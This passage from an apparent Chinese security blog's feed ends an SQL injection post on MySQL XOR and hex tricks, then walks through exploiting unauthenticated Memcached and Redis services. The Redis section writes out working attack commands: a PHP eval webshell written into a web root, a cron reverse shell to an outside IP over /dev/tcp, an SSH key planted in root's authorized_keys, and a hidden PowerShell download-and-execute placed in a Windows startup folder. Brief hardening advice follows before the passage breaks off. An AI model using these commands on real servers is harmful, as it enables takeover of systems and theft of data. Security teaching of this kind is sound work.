class="line">+-----------------+</span><br><span class="line">| unhex(74657374) |</span><br><span class="line">+-----------------+</span><br><span class="line">| test            |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#字符型按位异或</span><br><span class="line">mysql&gt; insert into ctf values (100 ,&#39;100&#39; ^ (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">|    100 | 74657338 | test      | 0    |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select unhex(&#39;100&#39;^74657338);</span><br><span class="line">+-----------------------+</span><br><span class="line">| unhex(&#39;100&#39;^74657338) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| test                  |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>mysql运算符</p><ul><li><p>按位或运算符–｜</p><p>0与任意的数字b或都为b</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; mysql&gt; select (0|1);</span><br><span class="line">+-------+</span><br><span class="line">| (0|1) |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0|2323);</span><br><span class="line">+----------+</span><br><span class="line">| (0|2323) |</span><br><span class="line">+----------+</span><br><span class="line">|     2323 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0|452323);</span><br><span class="line">+------------+</span><br><span class="line">| (0|452323) |</span><br><span class="line">+------------+</span><br><span class="line">|     452323 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>按位异或运算符–^</p><ul><li><p>0与任意的数字b异或都是b</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (0^452323);</span><br><span class="line">+------------+</span><br><span class="line">| (0^452323) |</span><br><span class="line">+------------+</span><br><span class="line">|     452323 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0^5644);</span><br><span class="line">+----------+</span><br><span class="line">| (0^5644) |</span><br><span class="line">+----------+</span><br><span class="line">|     5644 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>其他数字a与任意数字b异或得到c</p><p>可以通过c与a异或得到b，通常b是我们sql注入想要的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (10^5644);</span><br><span class="line">+-----------+</span><br><span class="line">| (10^5644) |</span><br><span class="line">+-----------+</span><br><span class="line">|      5638 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (10^5638);</span><br><span class="line">+-----------+</span><br><span class="line">| (10^5638) |</span><br><span class="line">+-----------+</span><br><span class="line">|      5644 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h5><p>1、mysql的网站注入，5.0以上和5.0以下有什么区别？</p><p>MySQL 5.0以上版本， 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p><p> 5.0以下是多用户单操作，5.0以上是多用户多操做。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h4&gt;&lt;p&gt;用户将恶意的sql语句输入到参数中，恶意语句拼接到后台sql语句，执行sql语句到时候使得攻击者获取到对应的敏感数据，比如当</summary>
      
    
    
    
    <category term="OWASP-TOP10" scheme="http://s1eady.top/categories/OWASP-TOP10/"/>
    
    
    <category term="OWSP-TOP10" scheme="http://s1eady.top/tags/OWSP-TOP10/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--常见未授权访问漏洞</title>
    <link href="http://s1eady.top/2020/06/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81/"/>
    <id>http://s1eady.top/2020/06/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81/</id>
    <published>2020-06-14T19:15:09.000Z</published>
    <updated>2020-11-27T06:27:59.284Z</updated>
    
    <content type="html"><![CDATA[<h1 id="未授权访问漏洞总结"><a href="#未授权访问漏洞总结" class="headerlink" title="未授权访问漏洞总结"></a>未授权访问漏洞总结</h1><h3 id="11211端口–memcache"><a href="#11211端口–memcache" class="headerlink" title="11211端口–memcache"></a>11211端口–memcache</h3><h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>Memcached 是一套常用的 key-value 缓存系统，由于它本身没有权限控制模块，所以对公网开放的 Memcache 服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取 Memcached 中的敏感信息。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="telnet直接连接目标端口"><a href="#telnet直接连接目标端口" class="headerlink" title="telnet直接连接目标端口"></a>telnet直接连接目标端口</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet xx.xx.xx.xx 11211</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ telnet ip 11211</span><br><span class="line">Trying ip...</span><br><span class="line">Connected to ip.</span><br><span class="line">Escape character is &#39;^]&#39;.</span><br></pre></td></tr></table></figure><h5 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV  -p 端口 --script memcached-info IP</span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-11-16 17:56 CST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> ip</span><br><span class="line">Host is up (<span class="number">0.54</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE   VERSION</span><br><span class="line"><span class="number">11211</span>/tcp open  memcached Memcached <span class="number">1.4</span><span class="number">.13</span> (uptime <span class="number">27164261</span> seconds)</span><br><span class="line">| memcached-info:</span><br><span class="line">|   Process ID: <span class="number">1121</span></span><br><span class="line">|   Uptime: <span class="number">27164262</span> seconds</span><br><span class="line">|   Server time: <span class="number">2020</span><span class="number">-11</span><span class="number">-16</span>T09:<span class="number">43</span>:<span class="number">25</span></span><br><span class="line">|   Architecture: <span class="number">64</span> bit</span><br><span class="line">|   Used CPU (user): <span class="number">1792.059996</span></span><br><span class="line">|   Used CPU (system): <span class="number">2583.961487</span></span><br><span class="line">|   Current connections: <span class="number">7</span></span><br><span class="line">|   Total connections: <span class="number">8070135</span></span><br><span class="line">|   Maximum connections: <span class="number">1024</span></span><br><span class="line">|   TCP Port: <span class="number">11211</span></span><br><span class="line">|   UDP Port: <span class="number">0</span></span><br><span class="line">|_  Authentication: no</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">15.20</span> seconds</span><br></pre></td></tr></table></figure><h4 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stats &#x2F;&#x2F;查看memcache 服务状态 </span><br><span class="line">stats items &#x2F;&#x2F;查看所有items </span><br><span class="line">stats cachedump 32 0 &#x2F;&#x2F;获得缓存key </span><br><span class="line">get :state:264861539228401373:261588 &#x2F;&#x2F;通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露</span><br></pre></td></tr></table></figure><h3 id="6379端口–Redis"><a href="#6379端口–Redis" class="headerlink" title="6379端口–Redis"></a>6379端口–Redis</h3><h4 id="Redis简介及搭建实验环境"><a href="#Redis简介及搭建实验环境" class="headerlink" title="Redis简介及搭建实验环境"></a>Redis简介及搭建实验环境</h4><p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是字符串(String), 哈希(Map), 列表(list), 集合(sets) 和有序集合(sorted sets)等类型。</p><h4 id="Redis默认端口"><a href="#Redis默认端口" class="headerlink" title="Redis默认端口"></a>Redis默认端口</h4><p>Redis默认配置端口为6379，sentinel.conf配置器端口为26379</p><p>默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件。</p><h4 id="连接Redis服务器"><a href="#连接Redis服务器" class="headerlink" title="连接Redis服务器"></a>连接Redis服务器</h4><p>（1）交互式方式</p><p>redis-cli -h {host} -p {port}方式连接，然后所有的操作都是在交互的方式实现，不需要再执行redis-cli了，例如命令：redis-cli -h 127.0.0.1-p 6379，加-a参数表示带密码的访问。</p><p>（2）命令方式<br>redis-cli -h {host} -p {port} {command}直接得到命令的返回结果.</p><h4 id="Redis特点"><a href="#Redis特点" class="headerlink" title="Redis特点"></a>Redis特点</h4><ul><li>随时执行“save”命令将当前redis的数据保存到硬盘上，另外redis也会根据配置自动存储数据到硬盘上。</li><li>dir 指定的是redis的“工作路径”，之后生成的RDB和AOF文件都会存储在这里。</li><li>dbfilename RDB文件名，默认为“dump.rdb”</li><li>appendonly 是否开启AOF</li></ul><h4 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F; 指定本地数据库存放目录</span><br><span class="line">config set dbfilename authorized_keys 指定本地数据库文件名，默认值为 dump.rdb</span><br></pre></td></tr></table></figure><p>（1）查看信息：info<br>（2）删除所有数据库内容：flushall<br>（3）刷新数据库：flushdb<br>（4）看所有键：KEYS *，使用select num可以查看键值数据。<br>（5）设置变量：set test “who am i”<br>（6）config set dir dirpath 设置路径等配置<br>（7）config get dir/dbfilename 获取路径及数据配置信息<br>（8）save保存<br>（9）get 变量，查看变量名称</p><h4 id="配置文件修改"><a href="#配置文件修改" class="headerlink" title="配置文件修改"></a>配置文件修改</h4><p>bind 127.0.0.1前面加上#号 </p><p>protected-mode设为no</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200902091712669.png" alt="image-20200902091712669"></p><p>默认的配置是使用6379端口，没有密码。</p><p>查看是否开放成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ netstat -ant | grep 6379</span><br><span class="line">tcp4       0      0  127.0.0.1.6379         *.*                    LISTEN</span><br></pre></td></tr></table></figure><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h5><h6 id="redis未授权访问漏洞利用与防御"><a href="#redis未授权访问漏洞利用与防御" class="headerlink" title="redis未授权访问漏洞利用与防御"></a>redis未授权访问漏洞利用与防御</h6><ul><li><h5 id="ssh-登录–公钥登录"><a href="#ssh-登录–公钥登录" class="headerlink" title="ssh 登录–公钥登录"></a>ssh 登录–公钥登录</h5><p>公钥登就是需要公钥文件，用户把公钥上传在远程服务器上，用户登录之后服务器发送一串随机数字给客户端，客户端使用私钥进行加密然后发送给服务端，服务端使用公钥进行解密。</p><p>使用ssh-keygen生成公钥，在生成的过程中对私钥设置口令（passphrase），如果担心私钥的安全，这里可以设置一个。</p><p>运行结束以后，在 $HOME/.ssh/目录下，会新生成两个文件：id_rsa.pub 和 id_rsa。前者是你的公钥，后者是你的私钥。</p><p>通常这时再输入下面的命令，将公钥传送到远程主机 host 上面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-copy-id user@host</span><br></pre></td></tr></table></figure><p>authorized_keys 文件，远程主机将用户的公钥，保存在登录后的用户主目录的$HOME/.ssh/authorized_keys 文件中。公钥就是一段字符串，只要把它追加在 authorized_keys 文件的末尾就行了。</p></li><li><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下(Redis 的默认配置)，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。</p><ul><li><h5 id="ssh-keygen公钥然后使用私钥登陆"><a href="#ssh-keygen公钥然后使用私钥登陆" class="headerlink" title="ssh-keygen公钥然后使用私钥登陆"></a>ssh-keygen公钥然后使用私钥登陆</h5><ol><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li></ol></li><li><h5 id="往web物理路径写webshell"><a href="#往web物理路径写webshell" class="headerlink" title="往web物理路径写webshell"></a>往web物理路径写webshell</h5><p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。</p><p>写入shell</p><p>前提：</p><p>1、开启web服务</p><p>2、对web服务有写入权限</p><p>3、知道web目录</p><p>kali开启redis服务</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200902194350551.png" alt="image-20200902194350551"></p><p>mac尝试连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ &#x2F;Applications&#x2F;MxSrvs&#x2F;bin&#x2F;redis&#x2F;bin&#x2F;redis-cli -h 192.168.195.130</span><br></pre></td></tr></table></figure><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.195.130:6379&gt; info</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200902194545161.png" alt="image-20200902194545161"></p><p>尝试写shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.195.130:6379&gt; config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; config set dbfilename redis.php</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; set webshell &quot;&lt;?php @eval($_POST[123]); ?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>在写shell的时候我们可以加上换行符，避免出现一下情况(\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200902195916508.png" alt="image-20200902195916508"></p><p>redis在生产环境里面数据量经常是十分庞大的，save到php文件里会超过php的允许文件大小，导致无法解析，我们可以先备份全部数据，然后在直接flushall全删掉。</p></li><li><p>计时任务反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br></pre></td></tr></table></figure><p>这个目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名。比如tom建的crontab任务对应的文件就是/var/spool/cron/tom，一般一个用户最多只有一个crontab文件。</p><p>攻击机监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -lnvp 6666</span><br></pre></td></tr></table></figure><p>连接靶机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ &#x2F;Applications&#x2F;MxSrvs&#x2F;bin&#x2F;redis&#x2F;bin&#x2F;redis-cli -h 192.168.195.130</span><br><span class="line">192.168.195.130:6379&gt; set x &quot;\n* * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;164.155.95.55&#x2F;6666 0&gt;&amp;1\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt;</span><br></pre></td></tr></table></figure></li><li><p>公钥登录</p><p>前提：</p><ol><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li></ol><p>kali生成一对密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@steady:~# ssh-keygen -t rsa</span><br><span class="line">Generating public&#x2F;private rsa key pair.</span><br><span class="line">Enter file in which to save the key (&#x2F;root&#x2F;.ssh&#x2F;id_rsa): </span><br><span class="line">Enter passphrase (empty for no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved in &#x2F;root&#x2F;.ssh&#x2F;id_rsa.</span><br><span class="line">Your public key has been saved in &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:&#x2F;29LS6&#x2F;F9OXUPX8naWC+1A2HomVSr3hjDVkR2vyUOtI root@steady</span><br><span class="line">The key&#39;s randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|              o. |</span><br><span class="line">|             + ..|</span><br><span class="line">|            o +..|</span><br><span class="line">|           ..+.+o|</span><br><span class="line">|        S ..OE+.O|</span><br><span class="line">|         . O.B.X&#x3D;|</span><br><span class="line">|          + B O X|</span><br><span class="line">|           &#x3D; *.&#x3D;o|</span><br><span class="line">|            oo&#x3D;o.|</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line">root@steady:~# </span><br></pre></td></tr></table></figure><p>kali查看公钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@steady:~&#x2F;.ssh# cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCYvK62OIoY1PHjAGXb4EzPeqI2JIp8b2IsX1YvGTH4o&#x2F;V&#x2F;KP75HMwGWWQwdZudb3taAKfyPlfoKszLm5a0Yj2WCz3m8qOIKsXIrMel9ik&#x2F;933ZOQmSVQWOh3Q26uBFteRFRg4dJ1t4uIE94hQhc4Hene7ypDfeKDTnRrZQNx0h4fB5l5bbrPBH7ATcj3H4159+OPTMkZ9u+bQK+Uo2yWwFfwKdsvLTLtGQJ9s+zIwes8dC+UdIjtVphVKj9fNABnYVpkfc42yAPpDLCaM3lbIHKeshsSllz7CctU9YmGwwpAfLiW6ojt7Ffqe5wrPJIMjbUdB95XQCtr3z4XHv&#x2F;TEwJlW4n7miwi3OUbLKrQNwAUNjPEKKmGzwsS+kR85Z6FqjghLiLc8A19j28JtAfmISM&#x2F;xZ&#x2F;SIRoeR+N801sup+jOMo7HbpbJK2SRJ8NSHoGzK5uXa7JrqtOZyBmYqAeNNiysDt9uRHwE0Kqmf0&#x2F;Q8oRe2hJ3eKqwHsTNkIFwG1nDs&#x3D; root@steady</span><br></pre></td></tr></table></figure><p>公钥上传到受害机器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.195.130:6379&gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCYvK62OIoY1PHjAGXb4EzPeqI2JIp8b2IsX1YvGTH4o&#x2F;V&#x2F;KP75HMwGWWQwdZudb3taAKfyPlfoKszLm5a0Yj2WCz3m8qOIKsXIrMel9ik&#x2F;933ZOQmSVQWOh3Q26uBFteRFRg4dJ1t4uIE94hQhc4Hene7ypDfeKDTnRrZQNx0h4fB5l5bbrPBH7ATcj3H4159+OPTMkZ9u+bQK+Uo2yWwFfwKdsvLTLtGQJ9s+zIwes8dC+UdIjtVphVKj9fNABnYVpkfc42yAPpDLCaM3lbIHKeshsSllz7CctU9YmGwwpAfLiW6ojt7Ffqe5wrPJIMjbUdB95XQCtr3z4XHv&#x2F;TEwJlW4n7miwi3OUbLKrQNwAUNjPEKKmGzwsS+kR85Z6FqjghLiLc8A19j28JtAfmISM&#x2F;xZ&#x2F;SIRoeR+N801sup+jOMo7HbpbJK2SRJ8NSHoGzK5uXa7JrqtOZyBmYqAeNNiysDt9uRHwE0Kqmf0&#x2F;Q8oRe2hJ3eKqwHsTNkIFwG1nDs&#x3D; root@steady\n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>使用攻击机并带上私钥登录目标服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ssh -i  &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;id_rsa  root@192.168.195.130</span><br><span class="line">Linux steady 5.4.0-kali3-amd64 #1 SMP Debian 5.4.13-1kali1 (2020-01-20) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Kali GNU&#x2F;Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">root@steady:~#</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>利用 Redis 写入 bat 文件到启动项(windows)</p><p>启动项：</p><p>启动项目，就是开机的时候系统会在前台或者后台运行的程序。许多程序的自启动，给我们带来了很多方便。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.xxx.1:6379&gt; config set dir &quot;C:&#x2F;Users&#x2F;Administrator&#x2F;AppData&#x2F;Roaming&#x2F;Microsoft&#x2F;Windows&#x2F;Start Menu&#x2F;Programs&#x2F;startup&#x2F;&quot;</span><br><span class="line">OK</span><br><span class="line">xxx.xxx.xxx.1:6379&gt; config set dbfilename shell.bat</span><br><span class="line">OK</span><br><span class="line">xxx.xxx.xxx.1:6379&gt; set x &quot;\r\n\r\npowershell -windowstyle hidden -exec bypass -c \&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;xxx.xxx.xxx.2&#x2F;shell.ps1&#39;);xx.ps1\&quot;\r\n\r\n&quot;</span><br><span class="line">OK</span><br><span class="line">xxx.xxx.xxx.1:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>使用msf或者cs进行监听，ps会反弹一个shell。</p></li></ul><ul><li><h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><ul><li><p>修改 redis.conf 文件</p><p>添加密码认证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">添加 requirepass mypassword</span><br></pre></td></tr></table></figure><p>禁止外网访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">添加 bind 127.0.0.1</span><br></pre></td></tr></table></figure></li><li><p>阻止其他用户添加新的公钥</p><p>将 <code>authorized_keys</code> 的权限设置为对拥有者只读，其他用户没有任何权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 ~&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure><p>保证 <code>authorized_keys</code> 的权限不会被改掉，需要设置该文件的 immutable 位权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># chattr +i ~&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure></li><li><p>用户还可以重命名 <code>~/.ssh</code>，然后新建新的 <code>~/.ssh</code> 目录和 <code>authorized_keys</code> 文件。要避免这种情况，需要设置 <code>~./ssh</code> 的 immutable 位权限</p><figure class="highlight 